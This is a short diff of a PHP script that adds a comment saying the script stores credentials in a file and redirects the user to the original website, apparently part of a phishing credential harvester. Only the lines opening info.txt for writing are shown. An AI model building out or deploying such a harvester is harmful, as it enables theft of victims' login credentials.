@@ -1,5 +1,5 @@
 <?php 
-
+//this stores credentials in a file and redirects the user to original website
 $myFile = "info.txt";
 $fh = fopen($myFile, 'w') or die("can't open file");
 
